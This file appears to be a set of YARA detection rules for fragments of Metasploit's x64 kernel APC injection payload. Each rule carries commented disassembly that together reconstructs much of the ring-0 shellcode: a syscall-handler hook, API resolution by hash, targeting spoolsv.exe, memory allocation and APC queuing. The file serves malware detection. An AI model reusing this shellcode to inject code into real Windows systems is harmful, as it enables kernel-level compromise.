
    rule multi_arch_kernel_queue_apc_payload_start_x64
    {
        meta:
            desc = "Metasploit::windows::x64::multi_arch_kernel_queue_apc::payload_start"
    
        /*
            31C9                 | 1.                   | xor ecx, ecx
            41                   | A                    | #ommited# db 0x41
            E201                 | ..                   | loop x64_payload_start
            C3                   | .                    | ret
        */
    
        strings:
            $a   = { 31 c9 ?? e2 01 c3 }
    
        condition:
            any of them
    }
    
    
    rule multi_arch_kernel_queue_apc_x64_syscall_overwrite_x64
    {
        meta:
            desc = "Metasploit::windows::x64::multi_arch_kernel_queue_apc::x64_syscall_overwrite"
    
        /*
            B9820000C0           | .....                | mov ecx, 0xc0000082
            0F32                 | .2                   | rdmsr
            48BBF80FD0FFFFFFFFFF | H.........           | #ommited# db 0x48, 0xbb, 0xf8, 0x0f, 0xd0, 0xff, 0xff, 0xff, 0xff, 0xff
            895304               | .S.                  | mov dword [rbx+0x4], edx
            8903                 | ..                   | mov dword [rbx], eax
            488D050A000000       | H......              | lea rax, [rel x64_syscall_handler]
            4889C2               | H..                  | mov rdx, rax
            48C1EA20             | H..                  | shr rdx, 0x20
            0F30                 | .0                   | wrmsr
            C3                   | .                    | ret
        */
    
        strings:
            $a   = { b9 82 00 00 c0 0f 32 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 89 53 04 89 03 48 8d 05 0a 00 00 00 48 89 c2 48 c1 ea 20 0f 30 c3 }
    
        condition:
            any of them
    }
    
    
    rule multi_arch_kernel_queue_apc_x64_syscall_handler_x64
    {
        meta:
            desc = "Metasploit::windows::x64::multi_arch_kernel_queue_apc::x64_syscall_handler"
    
        /*
            0F01F8               | ...                  | swapgs
            654889242510000000   | eH.$%....            | mov qword [gs:0x10], rsp
            65488B2425A8010000   | eH.$%....            | mov rsp, qword [gs:0x1a8]
            50                   | P                    | push rax
            53                   | S                    | push rbx
            51                   | Q                    | push rcx
            52                   | R                    | push rdx
            56                   | V                    | push rsi
            57                   | W                    | push rdi
            55                   | U                    | push rbp
            4150                 | AP                   | push r8
            4151                 | AQ                   | push r9
            4152                 | AR                   | push r10
            4153                 | AS                   | push r11
            4154                 | AT                   | push r12
            4155                 | AU                   | push r13
            4156                 | AV                   | push r14
            4157                 | AW                   | push r15
            6A2B                 | j+                   | push 0x2b
            65FF342510000000     | e.4%....             | push qword [gs:0x10]
            4153                 | AS                   | push r11
            6A33                 | j3                   | push 0x33
            51                   | Q                    | push rcx
            4C89D1               | L..                  | mov rcx, r10
            4883EC08             | H...                 | sub rsp, 0x8
            55                   | U                    | push rbp
            4881EC58010000       | H..X...              | sub rsp, 0x158
            488DAC2480000000     | H..$....             | lea rbp, [rsp + 0x80]
            48899DC0000000       | H......              | mov qword [rbp+0xc0],rbx
            4889BDC8000000       | H......              | mov qword [rbp+0xc8],rdi
            4889B5D0000000       | H......              | mov qword [rbp+0xd0],rsi
            48A1F80FD0FFFFFFFFFF | H.........           | #ommited# db 0x48, 0xa1, 0xf8, 0x0f, 0xd0, 0xff, 0xff, 0xff, 0xff, 0xff
            4889C2               | H..                  | mov rdx, rax
            48C1EA20             | H..                  | shr rdx, 0x20
            4831DB               | H1.                  | xor rbx, rbx
            FFCB                 | ..                   | dec ebx
            4821D8               | H!.                  | and rax, rbx
            B9820000C0           | .....                | mov ecx, 0xc0000082
            0F30                 | .0                   | wrmsr
            FB                   | .                    | sti
            E838000000           | .8...                | call x64_kernel_start
            FA                   | .                    | cli
            65488B2425A8010000   | eH.$%....            | mov rsp, qword [abs gs:0x1a8]
            4883EC78             | H..x                 | sub rsp, 0x78
            415F                 | A_                   | pop r15
            415E                 | A^                   | pop r14
            415D                 | A]                   | pop r13
            415C                 | A\                   | pop r12
            415B                 | A[                   | pop r11
            415A                 | AZ                   | pop r10
            4159                 | AY                   | pop r9
            4158                 | AX                   | pop r8
            5D                   | ]                    | pop rbp
            5F                   | _                    | pop rdi
            5E                   | ^                    | pop rsi
            5A                   | Z                    | pop rdx
            59                   | Y                    | pop rcx
            5B                   | [                    | pop rbx
            58                   | X                    | pop rax
            65488B242510000000   | eH.$%....            | mov rsp, qword [abs gs:0x10]
            0F01F8               | ...                  | swapgs
            FF2425F80FD0FF       | .$%....              | jmp [0xffffffffffd00ff8]
        */
    
        strings:
            $a   = { 0f 01 f8 65 48 89 24 25 10 00 00 00 65 48 8b 24 25 a8 01 00 00 50 53 51 52 56 57 55 41 50 41 51 41 52 41 53 41 54 41 55 41 56 41 57 6a 2b 65 ff 34 25 10 00 00 00 41 53 6a 33 51 4c 89 d1 48 83 ec 08 55 48 81 ec 58 01 00 00 48 8d ac 24 80 00 00 00 48 89 9d c0 00 00 00 48 89 bd c8 00 00 00 48 89 b5 d0 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 48 89 c2 48 c1 ea 20 48 31 db ff cb 48 21 d8 b9 82 00 00 c0 0f 30 fb e8 38 00 00 00 fa 65 48 8b 24 25 a8 01 00 00 48 83 ec 78 41 5f 41 5e 41 5d 41 5c 41 5b 41 5a 41 59 41 58 5d 5f 5e 5a 59 5b 58 65 48 8b 24 25 10 00 00 00 0f 01 f8 ff 24 25 f8 0f d0 ff }
    
        condition:
            any of them
    }
    
    
    rule multi_arch_kernel_queue_apc_x64_kernel_start_x64
    {
        meta:
            desc = "Metasploit::windows::x64::multi_arch_kernel_queue_apc::x64_kernel_start"
    
        /*
            56                   | V                    | push rsi
            4157                 | AW                   | push r15
            4156                 | AV                   | push r14
            4155                 | AU                   | push r13
            4154                 | AT                   | push r12
            53                   | S                    | push rbx
            55                   | U                    | push rbp
            4889E5               | H..                  | mov rbp, rsp
            6683E4F0             | f...                 | and sp, 0xfff0
            4883EC20             | H..                  | sub rsp, 0x20
            4C8D35E3FFFFFF       | L.5....              | lea r14, [rel x64_kernel_start]
        */
    
        strings:
            $a   = { 56 41 57 41 56 41 55 41 54 53 55 48 89 e5 66 83 e4 f0 48 83 ec 20 4c 8d 35 e3 ff ff ff }
    
        condition:
            any of them
    }
    
    
    rule multi_arch_kernel_queue_apc_x64_find_nt_idt_x64
    {
        meta:
            desc = "Metasploit::windows::x64::multi_arch_kernel_queue_apc::x64_find_nt_idt"
    
        /*
            654C8B3C2538000000   | eL.<%8...            | mov r15, qword [gs:0x38]
            4D8B7F04             | M...                 | mov r15, qword [r15 + 0x4]
            49C1EF0C             | I...                 | shr r15, 0xc
            49C1E70C             | I...                 | shl r15, 0xc
        */
    
        strings:
            $a   = { 65 4c 8b 3c 25 38 00 00 00 4d 8b 7f 04 49 c1 ef 0c 49 c1 e7 0c }
    
        condition:
            any of them
    }
    
    
    rule multi_arch_kernel_queue_apc__x64_find_nt_idt_walk_page_x64
    {
        meta:
            desc = "Metasploit::windows::x64::multi_arch_kernel_queue_apc::_x64_find_nt_idt_walk_page"
    
        /*
            4981EF00100000       | I......              | sub r15, 0x1000
            498B37               | I.7                  | mov rsi, qword [r15]
            6681FE4D5A           | f..MZ                | cmp si, 0x5a4d
            75EF                 | u.                   | jne _x64_find_nt_idt_walk_page
        */
    
        strings:
            $a   = { 49 81 ef 00 10 00 00 49 8b 37 66 81 fe 4d 5a 75 ef }
    
        condition:
            any of them
    }
    
    
    rule multi_arch_kernel_queue_apc_find_threadlistentry_offset_x64
    {
        meta:
            desc = "Metasploit::windows::x64::multi_arch_kernel_queue_apc::find_threadlistentry_offset"
    
        /*
            41BB5C721162         | A.\r.b               | mov r11d, psgetcurrentprocess_hash
            E818020000           | .....                | call x64_block_api_direct
            4889C6               | H..                  | mov rsi, rax
            4881C608030000       | H......              | add rsi, eprocess_threadlisthead_blink_offset
            41BB7ABAA330         | A.z..0               | mov r11d, kegetcurrentthread_hash
            E803020000           | .....                | call x64_block_api_direct
            4889F1               | H..                  | mov rcx, rsi
        */
    
        strings:
            $a   = { 41 bb 5c 72 11 62 e8 18 02 00 00 48 89 c6 48 81 c6 08 03 00 00 41 bb 7a ba a3 30 e8 03 02 00 00 48 89 f1 }
    
        condition:
            any of them
    }
    
    
    rule multi_arch_kernel_queue_apc__find_threadlistentry_offset_compare_threads_x64
    {
        meta:
            desc = "Metasploit::windows::x64::multi_arch_kernel_queue_apc::_find_threadlistentry_offset_compare_threads"
    
        /*
            4839F0               | H9.                  | cmp rax, rsi
            7711                 | w.                   | ja _find_threadlistentry_offset_walk_threads
            488D9000050000       | H......              | lea rdx, [rax + 0x500]
            4839F2               | H9.                  | cmp rdx, rsi
            7205                 | r.                   | jb _find_threadlistentry_offset_walk_threads
            4829C6               | H).                  | sub rsi, rax
            EB08                 | ..                   | jmp _find_threadlistentry_offset_calc_thread_exit
        */
    
        strings:
            $a   = { 48 39 f0 77 11 48 8d 90 00 05 00 00 48 39 f2 72 05 48 29 c6 eb 08 }
    
        condition:
            any of them
    }
    
    
    rule multi_arch_kernel_queue_apc__find_threadlistentry_offset_walk_threads_x64
    {
        meta:
            desc = "Metasploit::windows::x64::multi_arch_kernel_queue_apc::_find_threadlistentry_offset_walk_threads"
    
        /*
            488B36               | H.6                  | mov rsi, qword [rsi]
            4839CE               | H9.                  | cmp rsi, rcx
            75E2                 | u.                   | jne _find_threadlistentry_offset_compare_threads
        */
    
        strings:
            $a   = { 48 8b 36 48 39 ce 75 e2 }
    
        condition:
            any of them
    }
    
    
    rule multi_arch_kernel_queue_apc__x64_find_process_name_loop_pid_x64
    {
        meta:
            desc = "Metasploit::windows::x64::multi_arch_kernel_queue_apc::_x64_find_process_name_loop_pid"
    
        /*
            89D9                 | ..                   | mov ecx, ebx
            83C104               | ...                  | add ecx, 0x4
            81F900000100         | ......               | cmp ecx, 0x10000
            0F8D66010000         | ..f...               | jge x64_kernel_exit
            4C89F2               | L..                  | mov rdx, r14
            89CB                 | ..                   | mov ebx, ecx
            41BB6655A24B         | A.fU.K               | mov r11d, pslookupprocessbyprocessid_hash
            E8BC010000           | .....                | call x64_block_api_direct
            85C0                 | ..                   | test eax, eax
            75DB                 | u.                   | jnz _x64_find_process_name_loop_pid
            498B0E               | I..                  | mov rcx, [r14]
            41BBA36F722D         | A..or-               | mov r11d, psgetprocessimagefilename_hash
            E8AA010000           | .....                | call x64_block_api_direct
            4889C6               | H..                  | mov rsi, rax
            E850010000           | .P...                | call x64_calc_hash
            4181F9BF771FDD       | A...w..              | cmp r9d, spoolsv_exe_hash
            75BC                 | u.                   | jne _x64_find_process_name_loop_pid
        */
    
        strings:
            $a   = { 89 d9 83 c1 04 81 f9 00 00 01 00 0f 8d 66 01 00 00 4c 89 f2 89 cb 41 bb 66 55 a2 4b e8 bc 01 00 00 85 c0 75 db 49 8b 0e 41 bb a3 6f 72 2d e8 aa 01 00 00 48 89 c6 e8 50 01 00 00 41 81 f9 bf 77 1f dd 75 bc }
    
        condition:
            any of them
    }
    
    
    rule multi_arch_kernel_queue_apc_x64_attach_process_x64
    {
        meta:
            desc = "Metasploit::windows::x64::multi_arch_kernel_queue_apc::x64_attach_process"
    
        /*
            498B1E               | I..                  | mov rbx, [r14]
            4D8D6E10             | M.n.                 | lea r13, [r14 + 16]
            4C89EA               | L..                  | mov rdx, r13
            4889D9               | H..                  | mov rcx, rbx
            41BBE52411DC         | A..$..               | mov r11d, kestackattachprocess_hash
            E881010000           | .....                | call x64_block_api_direct
            6A40                 | j@                   | push 0x40
            6800100000           | h....                | push 0x1000
            4D8D4E08             | M.N.                 | lea r9, [r14 + 8]
            49C70100100000       | I......              | mov qword [r9], 0x1000
            4D31C0               | M1.                  | xor r8, r8
            4C89F2               | L..                  | mov rdx, r14
            31C9                 | 1.                   | xor ecx, ecx
            48890A               | H..                  | mov qword [rdx], rcx
            48F7D1               | H..                  | not rcx
            41BB4BCA0AEE         | A.K...               | mov r11d, zwallocatevirtualmemory_hash
            4883EC20             | H..                  | sub rsp, 0x20
            E852010000           | .R...                | call x64_block_api_direct
            85C0                 | ..                   | test eax, eax
            0F85C8000000         | ......               | jnz x64_kernel_exit_cleanup
        */
    
        strings:
            $a   = { 49 8b 1e 4d 8d 6e 10 4c 89 ea 48 89 d9 41 bb e5 24 11 dc e8 81 01 00 00 6a 40 68 00 10 00 00 4d 8d 4e 08 49 c7 01 00 10 00 00 4d 31 c0 4c 89 f2 31 c9 48 89 0a 48 f7 d1 41 bb 4b ca 0a ee 48 83 ec 20 e8 52 01 00 00 85 c0 0f 85 c8 00 00 00 }
    
        condition:
            any of them
    }
    
    
    rule multi_arch_kernel_queue_apc_x64_memcpy_userland_payload_x64
    {
        meta:
            desc = "Metasploit::windows::x64::multi_arch_kernel_queue_apc::x64_memcpy_userland_payload"
    
        /*
            498B3E               | I.>                  | mov rdi, [r14]
            488D35E9000000       | H.5....              | lea rsi, [rel userland_start]
            31C9                 | 1.                   | xor ecx, ecx
            66030DD7010000       | f......              | add cx, word [rel userland_payload_size]
            6681C1F900           | f....                | add cx, userland_payload - userland_start
            F3A4                 | ..                   | rep movsb
        */
    
        strings:
            $a   = { 49 8b 3e 48 8d 35 e9 00 00 00 31 c9 66 03 0d d7 01 00 00 66 81 c1 f9 00 f3 a4 }
    
        condition:
            any of them
    }
    
    
    rule multi_arch_kernel_queue_apc_x64_find_alertable_thread_x64
    {
        meta:
            desc = "Metasploit::windows::x64::multi_arch_kernel_queue_apc::x64_find_alertable_thread"
    
        /*
            4889DE               | H..                  | mov rsi, rbx
            4881C608030000       | H......              | add rsi, eprocess_threadlisthead_blink_offset
            4889F1               | H..                  | mov rcx, rsi
        */
    
        strings:
            $a   = { 48 89 de 48 81 c6 08 03 00 00 48 89 f1 }
    
        condition:
            any of them
    }
    
    
    rule multi_arch_kernel_queue_apc__x64_find_alertable_thread_loop_x64
    {
        meta:
            desc = "Metasploit::windows::x64::multi_arch_kernel_queue_apc::_x64_find_alertable_thread_loop"
    
        /*
            488B11               | H..                  | mov rdx, [rcx]
            4C29E2               | L).                  | sub rdx, r12
            51                   | Q                    | push rcx
            52                   | R                    | push rdx
            4889D1               | H..                  | mov rcx, rdx
            4883EC20             | H..                  | sub rsp, 0x20
            41BB2640369D         | A.&@6.               | mov r11d, psgetthreadteb_hash
            E809010000           | .....                | call x64_block_api_direct
            4883C420             | H..                  | add rsp, 0x20
            5A                   | Z                    | pop rdx
            59                   | Y                    | pop rcx
            4885C0               | H..                  | test rax, rax
            7418                 | t.                   | je _x64_find_alertable_thread_skip_next
            488B80C8020000       | H......              | mov rax, qword [rax + teb_activationcontextstackpointer_offset]
            4885C0               | H..                  | test rax, rax
            740C                 | t.                   | je _x64_find_alertable_thread_skip_next
            4883C24C             | H..L                 | add rdx, ethread_alertable_offset
            8B02                 | ..                   | mov eax, dword [rdx]
            0FBAE005             | ....                 | bt eax, 0x5
            7205                 | r.                   | jb _x64_find_alertable_thread_found
        */
    
        strings:
            $a   = { 48 8b 11 4c 29 e2 51 52 48 89 d1 48 83 ec 20 41 bb 26 40 36 9d e8 09 01 00 00 48 83 c4 20 5a 59 48 85 c0 74 18 48 8b 80 c8 02 00 00 48 85 c0 74 0c 48 83 c2 4c 8b 02 0f ba e0 05 72 05 }
    
        condition:
            any of them
    }
    
    
    rule multi_arch_kernel_queue_apc__x64_find_alertable_thread_skip_next_x64
    {
        meta:
            desc = "Metasploit::windows::x64::multi_arch_kernel_queue_apc::_x64_find_alertable_thread_skip_next"
    
        /*
            488B09               | H..                  | mov rcx, [rcx]
            EBBE                 | ..                   | jmp _x64_find_alertable_thread_loop
        */
    
        strings:
            $a   = { 48 8b 09 eb be }
    
        condition:
            any of them
    }
    
    
    rule multi_arch_kernel_queue_apc__x64_find_alertable_thread_found_x64
    {
        meta:
            desc = "Metasploit::windows::x64::multi_arch_kernel_queue_apc::_x64_find_alertable_thread_found"
    
        /*
            4883EA4C             | H..L                 | sub rdx, ethread_alertable_offset
            4989D4               | I..                  | mov r12, rdx
        */
    
        strings:
            $a   = { 48 83 ea 4c 49 89 d4 }
    
        condition:
            any of them
    }
    
    
    rule multi_arch_kernel_queue_apc_x64_create_apc_x64
    {
        meta:
            desc = "Metasploit::windows::x64::multi_arch_kernel_queue_apc::x64_create_apc"
    
        /*
            31D2                 | 1.                   | xor edx, edx
            80C290               | ...                  | add dl, 0x90
            31C9                 | 1.                   | xor ecx, ecx
            41BB26AC5091         | A.&.P.               | mov r11d, exallocatepool_hash
            E8C8000000           | .....                | call x64_block_api_direct
            4889C1               | H..                  | mov rcx, rax
            4C8D8980000000       | L......              | lea r9, [rcx + 0x80]
            41C601C3             | A...                 | mov byte [r9], 0xc3
            4C89E2               | L..                  | mov rdx, r12
            4989C4               | I..                  | mov r12, rax
            4D31C0               | M1.                  | xor r8, r8
            4150                 | AP                   | push r8
            6A01                 | j.                   | push 0x1
            498B06               | I..                  | mov rax, [r14]
            50                   | P                    | push rax
            4150                 | AP                   | push r8
            4883EC20             | H..                  | sub rsp, 0x20
            41BBACCE554B         | A...UK               | mov r11d, keinitializeapc_hash
            E898000000           | .....                | call x64_block_api_direct
            31D2                 | 1.                   | xor edx, edx
            52                   | R                    | push rdx
            52                   | R                    | push rdx
            4158                 | AX                   | pop r8
            4159                 | AY                   | pop r9
            4C89E1               | L..                  | mov rcx, r12
            41BB1838099E         | A..8..               | mov r11d, keinsertqueueapc_hash
            E882000000           | .....                | call x64_block_api_direct
        */
    
        strings:
            $a   = { 31 d2 80 c2 90 31 c9 41 bb 26 ac 50 91 e8 c8 00 00 00 48 89 c1 4c 8d 89 80 00 00 00 41 c6 01 c3 4c 89 e2 49 89 c4 4d 31 c0 41 50 6a 01 49 8b 06 50 41 50 48 83 ec 20 41 bb ac ce 55 4b e8 98 00 00 00 31 d2 52 52 41 58 41 59 4c 89 e1 41 bb 18 38 09 9e e8 82 00 00 00 }
    
        condition:
            any of them
    }
    
    
    rule multi_arch_kernel_queue_apc_x64_kernel_exit_cleanup_x64
    {
        meta:
            desc = "Metasploit::windows::x64::multi_arch_kernel_queue_apc::x64_kernel_exit_cleanup"
    
        /*
            4C89E9               | L..                  | mov rcx, r13
            41BB22B7B37D         | A."..}               | mov r11d, keunstackdetachprocess_hash
            E874000000           | .t...                | call x64_block_api_direct
            4889D9               | H..                  | mov rcx, rbx
            41BB0DE24D85         | A...M.               | mov r11d, obdereferenceobject_hash
            E866000000           | .f...                | call x64_block_api_direct
        */
    
        strings:
            $a   = { 4c 89 e9 41 bb 22 b7 b3 7d e8 74 00 00 00 48 89 d9 41 bb 0d e2 4d 85 e8 66 00 00 00 }
    
        condition:
            any of them
    }
    
    
    rule multi_arch_kernel_queue_apc_x64_kernel_exit_x64
    {
        meta:
            desc = "Metasploit::windows::x64::multi_arch_kernel_queue_apc::x64_kernel_exit"
    
        /*
            4889EC               | H..                  | mov rsp, rbp
            5D                   | ]                    | pop rbp
            5B                   | [                    | pop rbx
            415C                 | A\                   | pop r12
            415D                 | A]                   | pop r13
            415E                 | A^                   | pop r14
            415F                 | A_                   | pop r15
            5E                   | ^                    | pop rsi
            C3                   | .                    | ret
        */
    
        strings:
            $a   = { 48 89 ec 5d 5b 41 5c 41 5d 41 5e 41 5f 5e c3 }
    
        condition:
            any of them
    }
    
    
    rule multi_arch_kernel_queue_apc__x64_calc_hash_loop_x64
    {
        meta:
            desc = "Metasploit::windows::x64::multi_arch_kernel_queue_apc::_x64_calc_hash_loop"
    
        /*
            31C0                 | 1.                   | xor eax, eax
            AC                   | .                    | lodsb
            41C1C90D             | A...                 | ror r9d, 13
            3C61                 | <a                   | cmp al, 'a'
            7C02                 | |.                   | jl _x64_calc_hash_not_lowercase
            2C20                 | ,                    | sub al, 0x20
        */
    
        strings:
            $a   = { 31 c0 ac 41 c1 c9 0d 3c 61 7c 02 2c 20 }
    
        condition:
            any of them
    }
    
    
    rule multi_arch_kernel_queue_apc__x64_calc_hash_not_lowercase_x64
    {
        meta:
            desc = "Metasploit::windows::x64::multi_arch_kernel_queue_apc::_x64_calc_hash_not_lowercase"
    
        /*
            4101C1               | A..                  | add r9d, eax
            38E0                 | 8.                   | cmp al, ah
            75EC                 | u.                   | jne _x64_calc_hash_loop
            C3                   | .                    | ret
        */
    
        strings:
            $a   = { 41 01 c1 38 e0 75 ec c3 }
    
        condition:
            any of them
    }
    
    
    rule multi_arch_kernel_queue_apc_x64_block_find_dll_x64
    {
        meta:
            desc = "Metasploit::windows::x64::multi_arch_kernel_queue_apc::x64_block_find_dll"
    
        /*
            31D2                 | 1.                   | xor edx, edx
            65488B5260           | eH.R`                | mov rdx, [gs:rdx + 96]
            488B5218             | H.R.                 | mov rdx, [rdx + 24]
            488B5220             | H.R                  | mov rdx, [rdx + 32]
        */
    
        strings:
            $a   = { 31 d2 65 48 8b 52 60 48 8b 52 18 48 8b 52 20 }
    
        condition:
            any of them
    }
    
    
    rule multi_arch_kernel_queue_apc__x64_block_find_dll_next_mod_x64
    {
        meta:
            desc = "Metasploit::windows::x64::multi_arch_kernel_queue_apc::_x64_block_find_dll_next_mod"
    
        /*
            488B12               | H..                  | mov rdx, [rdx]
            488B7250             | H.rP                 | mov rsi, [rdx + 80]
            480FB74A4A           | H..JJ                | movzx rcx, word [rdx + 74]
            4531C9               | E1.                  | xor r9d, r9d
        */
    
        strings:
            $a   = { 48 8b 12 48 8b 72 50 48 0f b7 4a 4a 45 31 c9 }
    
        condition:
            any of them
    }
    
    
    rule multi_arch_kernel_queue_apc__x64_block_find_dll_loop_mod_name_x64
    {
        meta:
            desc = "Metasploit::windows::x64::multi_arch_kernel_queue_apc::_x64_block_find_dll_loop_mod_name"
    
        /*
            31C0                 | 1.                   | xor eax, eax
            AC                   | .                    | lodsb
            3C61                 | <a                   | cmp al, 'a'
            7C02                 | |.                   | jl _x64_block_find_dll_not_lowercase
            2C20                 | ,                    | sub al, 0x20
        */
    
        strings:
            $a   = { 31 c0 ac 3c 61 7c 02 2c 20 }
    
        condition:
            any of them
    }
    
    
    rule multi_arch_kernel_queue_apc__x64_block_find_dll_not_lowercase_x64
    {
        meta:
            desc = "Metasploit::windows::x64::multi_arch_kernel_queue_apc::_x64_block_find_dll_not_lowercase"
    
        /*
            41C1C90D             | A...                 | ror r9d, 13
            4101C1               | A..                  | add r9d, eax
            E2EE                 | ..                   | loop _x64_block_find_dll_loop_mod_name
            4539D9               | E9.                  | cmp r9d, r11d
            75DA                 | u.                   | jnz _x64_block_find_dll_next_mod
            4C8B7A20             | L.z                  | mov r15, [rdx + 32]
            C3                   | .                    | ret
        */
    
        strings:
            $a   = { 41 c1 c9 0d 41 01 c1 e2 ee 45 39 d9 75 da 4c 8b 7a 20 c3 }
    
        condition:
            any of them
    }
    
    
    rule multi_arch_kernel_queue_apc_x64_block_api_direct_x64
    {
        meta:
            desc = "Metasploit::windows::x64::multi_arch_kernel_queue_apc::x64_block_api_direct"
    
        /*
            4C89F8               | L..                  | mov rax, r15
            4151                 | AQ                   | push r9
            4150                 | AP                   | push r8
            52                   | R                    | push rdx
            51                   | Q                    | push rcx
            56                   | V                    | push rsi
            4889C2               | H..                  | mov rdx, rax
            8B423C               | .B<                  | mov eax, dword [rdx+60]
            4801D0               | H..                  | add rax, rdx
            8B8088000000         | ......               | mov eax, dword [rax+136]
            4801D0               | H..                  | add rax, rdx
            50                   | P                    | push rax
            8B4818               | .H.                  | mov ecx, dword [rax+24]
            448B4020             | D.@                  | mov r8d, dword [rax+32]
            4901D0               | I..                  | add r8, rdx
        */
    
        strings:
            $a   = { 4c 89 f8 41 51 41 50 52 51 56 48 89 c2 8b 42 3c 48 01 d0 8b 80 88 00 00 00 48 01 d0 50 8b 48 18 44 8b 40 20 49 01 d0 }
    
        condition:
            any of them
    }
    
    
    rule multi_arch_kernel_queue_apc__x64_block_api_direct_get_next_func_x64
    {
        meta:
            desc = "Metasploit::windows::x64::multi_arch_kernel_queue_apc::_x64_block_api_direct_get_next_func"
    
        /*
            48FFC9               | H..                  | dec rcx
            418B3488             | A.4.                 | mov esi, dword [r8+rcx*4]
            4801D6               | H..                  | add rsi, rdx
            E878FFFFFF           | .x...                | call x64_calc_hash
            4539D9               | E9.                  | cmp r9d, r11d
            75EC                 | u.                   | jnz _x64_block_api_direct_get_next_func
        */
    
        strings:
            $a   = { 48 ff c9 41 8b 34 88 48 01 d6 e8 78 ff ff ff 45 39 d9 75 ec }
    
        condition:
            any of them
    }
    
    
    rule multi_arch_kernel_queue_apc__x64_block_api_direct_finish_x64
    {
        meta:
            desc = "Metasploit::windows::x64::multi_arch_kernel_queue_apc::_x64_block_api_direct_finish"
    
        /*
            58                   | X                    | pop rax
            448B4024             | D.@$                 | mov r8d, dword [rax+36]
            4901D0               | I..                  | add r8, rdx
            66418B0C48           | fA..H                | mov cx, [r8+2*rcx]
            448B401C             | D.@.                 | mov r8d, dword [rax+28]
            4901D0               | I..                  | add r8, rdx
            418B0488             | A...                 | mov eax, dword [r8+4*rcx]
            4801D0               | H..                  | add rax, rdx
            5E                   | ^                    | pop rsi
            59                   | Y                    | pop rcx
            5A                   | Z                    | pop rdx
            4158                 | AX                   | pop r8
            4159                 | AY                   | pop r9
            415B                 | A[                   | pop r11
            4153                 | AS                   | push r11
            FFE0                 | ..                   | jmp rax
        */
    
        strings:
            $a   = { 58 44 8b 40 24 49 01 d0 66 41 8b 0c 48 44 8b 40 1c 49 01 d0 41 8b 04 88 48 01 d0 5e 59 5a 41 58 41 59 41 5b 41 53 ff e0 }
    
        condition:
            any of them
    }
    
    
    rule multi_arch_kernel_queue_apc_x64_userland_start_thread_x64
    {
        meta:
            desc = "Metasploit::windows::x64::multi_arch_kernel_queue_apc::x64_userland_start_thread"
    
        /*
            56                   | V                    | push rsi
            4157                 | AW                   | push r15
            55                   | U                    | push rbp
            4889E5               | H..                  | mov rbp, rsp
            4883EC20             | H..                  | sub rsp, 0x20
            41BBDA16AF92         | A.....               | mov r11d, kernel32_dll_hash
            E84DFFFFFF           | .M...                | call x64_block_find_dll
            31C9                 | 1.                   | xor ecx, ecx
            51                   | Q                    | push rcx
            51                   | Q                    | push rcx
            51                   | Q                    | push rcx
            51                   | Q                    | push rcx
            4159                 | AY                   | pop r9
            4C8D051A000000       | L......              | lea r8, [rel userland_payload]
            5A                   | Z                    | pop rdx
            4883EC20             | H..                  | sub rsp, 0x20
            41BB46451B22         | A.FE."               | mov r11d, createthread_hash
            E868FFFFFF           | .h...                | call x64_block_api_direct
            4889EC               | H..                  | mov rsp, rbp
            5D                   | ]                    | pop rbp
            415F                 | A_                   | pop r15
            5E                   | ^                    | pop rsi
            C3                   | .                    | ret
        */
    
        strings:
            $a   = { 56 41 57 55 48 89 e5 48 83 ec 20 41 bb da 16 af 92 e8 4d ff ff ff 31 c9 51 51 51 51 41 59 4c 8d 05 1a 00 00 00 5a 48 83 ec 20 41 bb 46 45 1b 22 e8 68 ff ff ff 48 89 ec 5d 41 5f 5e c3 }
    
        condition:
            any of them
    }
    
    